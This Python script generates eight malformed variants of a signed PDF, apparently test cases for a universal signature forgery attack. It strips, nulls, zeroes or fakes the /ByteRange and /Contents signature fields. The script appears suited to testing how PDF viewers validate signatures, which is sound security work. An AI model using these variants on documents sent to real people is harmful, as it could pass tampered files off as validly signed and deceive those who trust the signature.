import re

var_byte_range = "ByteRange"
var_byte_range_full = "/ByteRange"
var_contents_full = "/Contents"
var_fake_byte_range = "[ -1 68514 197590 321441 ]"


def get_bytes_from_str(string):
    b = bytearray()
    b.extend(map(ord, string))
    return b


def create_usf_variant1_no_byte_range_complete():
    """Create a new pdf with out the byte range. This means
        that the byte range data is removed but also the tag
        /ByteRange is removed.
        """
    with open('signed.pdf', 'rb') as f1:
        with open('usf_variant1_no_byte_range_complete.pdf', 'wb') as f2:
            while True:
                buf = f1.read(1024)
                if buf:
                    bytes_str = "".join(map(chr, buf))
                    if var_byte_range in bytes_str:
                        pattern = re.compile(r"[\/]ByteRange\s\[.*\]")
                        result = pattern.sub("", bytes_str)
                        buf = get_bytes_from_str(result)
                    n = f2.write(buf)
                else:
                    break


def create_usf_variant1_no_content_complete():
    """Create a new pdf with out the Contents. This means
         that the Contents data is removed but also the tag
         /Contents is removed.
         """
    signature_found = False
    with open('signed.pdf', 'rb') as f1:
        with open('usf_variant1_no_content_complete.pdf', 'wb') as f2:
            while True:
                buf = f1.read(2048)
                if buf:
                    bytes_str = "".join(map(chr, buf))
                    if var_byte_range in bytes_str:
                        signature_found = True
                        pattern = re.compile(r"[\/]Contents.*")
                        result = pattern.sub("", bytes_str)
                        buf = get_bytes_from_str(result)
                        n = f2.write(buf)
                    if signature_found and "/Reference" in bytes_str:
                        pattern = re.compile(r".*[\ /]Reference")
                        result = pattern.sub("/Reference", bytes_str)
                        buf = get_bytes_from_str(result)
                        n = f2.write(buf)
                        signature_found = False
                    else:
                        if not signature_found:
                            n = f2.write(buf)
                else:
                    break


def create_usf_variant2_no_byte_range_preserved():
    """Create a new pdf without the byte range. This means
        that the byte range data is removed. The tag
        /ByteRange is preserved.
        """
    with open('signed.pdf', 'rb') as f1:
        with open('usf_variant2_no_byte_range_preserved.pdf', 'wb') as f2:
            while True:
                buf = f1.read(1024)
                if buf:
                    bytes_str = "".join(map(chr, buf))
                    if var_byte_range in bytes_str:
                        pattern = re.compile(r"[\/]ByteRange\s\[.*\]")
                        result = pattern.sub(var_byte_range_full, bytes_str)
                        buf = get_bytes_from_str(result)
                    n = f2.write(buf)
                else:
                    break


def create_usf_variant2_no_content_preserved():
    """Create a new pdf with out the Contents. This means
         that the Contents data is removed. The tag
         /Contents is preserved.
         """
    signature_found = False
    with open('signed.pdf', 'rb') as f1:
        with open('usf_variant2_no_content_preserved.pdf', 'wb') as f2:
            while True:
                buf = f1.read(2048)
                if buf:
                    bytes_str = "".join(map(chr, buf))
                    if var_byte_range in bytes_str:
                        signature_found = True
                        pattern = re.compile(r"[\/]Contents.*")
                        result = pattern.sub(var_contents_full, bytes_str)
                        buf = get_bytes_from_str(result)
                        n = f2.write(buf)
                    if signature_found and "/Reference" in bytes_str:
                        pattern = re.compile(r".*[\ /]Reference")
                        result = pattern.sub("/Reference", bytes_str)
                        buf = get_bytes_from_str(result)
                        n = f2.write(buf)
                        signature_found = False
                    else:
                        if not signature_found:
                            n = f2.write(buf)
                else:
                    break


def create_usf_variant3_byte_range_null():
    """Create a new pdf with the byte range set to NULL.
        """
    with open('signed.pdf', 'rb') as f1:
        with open('usf_variant3_byte_range_null.pdf', 'wb') as f2:
            while True:
                buf = f1.read(1024)
                if buf:
                    bytes_str = "".join(map(chr, buf))
                    if var_byte_range in bytes_str:
                        pattern = re.compile(r"[/]ByteRange\s\[.*]")
                        result = pattern.sub(var_byte_range_full + " " + "null ", bytes_str)
                        buf = get_bytes_from_str(result)
                    n = f2.write(buf)
                else:
                    break


def create_usf_variant3_contents_null():
    """Create a new pdf with /Contents to null
         """
    signature_found = False
    with open('signed.pdf', 'rb') as f1:
        with open('usf_variant3_contents_null.pdf', 'wb') as f2:
            while True:
                buf = f1.read(2048)
                if buf:
                    bytes_str = "".join(map(chr, buf))
                    if var_byte_range in bytes_str:
                        signature_found = True
                        pattern = re.compile(r'[/]Contents.*')
                        result = pattern.sub(var_contents_full + " " + "null ", bytes_str)
                        buf = get_bytes_from_str(result)
                        n = f2.write(buf)
                    if signature_found and "/Reference" in bytes_str:
                        pattern = re.compile(r'.*[/]Reference')
                        result = pattern.sub("/Reference", bytes_str)
                        buf = get_bytes_from_str(result)
                        n = f2.write(buf)
                        signature_found = False
                    else:
                        if not signature_found:
                            n = f2.write(buf)
                else:
                    break


def create_usf_variant4_contents_zero():
    """Create a new pdf with /Contents to 0x00
         """
    signature_found = False
    with open('signed.pdf', 'rb') as f1:
        with open('usf_variant4_contents_zero.pdf', 'wb') as f2:
            while True:
                buf = f1.read(2048)
                if buf:
                    bytes_str = "".join(map(chr, buf))
                    if var_byte_range in bytes_str:
                        signature_found = True
                        pattern = re.compile(r'[/]Contents.*')
                        result = pattern.sub(var_contents_full + " " + "0x00" + " ", bytes_str)
                        buf = get_bytes_from_str(result)
                        n = f2.write(buf)
                    if signature_found and "/Reference" in bytes_str:
                        pattern = re.compile(r'.*[/]Reference')
                        result = pattern.sub("/Reference", bytes_str)
                        buf = get_bytes_from_str(result)
                        n = f2.write(buf)
                        signature_found = False
                    else:
                        if not signature_found:
                            n = f2.write(buf)
                else:
                    break


def create_usf_variant4_incorrect_byteRange_data():
    """Create a new pdf with the byte range changed.
        """
    with open('signed.pdf', 'rb') as f1:
        with open('usf_variant4_incorrect_byteRange_data.pdf', 'wb') as f2:
            while True:
                buf = f1.read(1024)
                if buf:
                    bytes_str = "".join(map(chr, buf))
                    if var_byte_range in bytes_str:
                        pattern = re.compile(r"[/]ByteRange\s\[.*]")
                        result = pattern.sub(var_byte_range_full +
                                             " " + var_fake_byte_range + " ", bytes_str)
                        buf = get_bytes_from_str(result)
                    n = f2.write(buf)
                else:
                    break


if __name__ == "__main__":
    create_usf_variant1_no_byte_range_complete()
    create_usf_variant1_no_content_complete()
    create_usf_variant2_no_content_preserved()
    create_usf_variant2_no_byte_range_preserved()
    create_usf_variant3_contents_null()
    create_usf_variant3_byte_range_null()
    create_usf_variant4_contents_zero()
    create_usf_variant4_incorrect_byteRange_data()
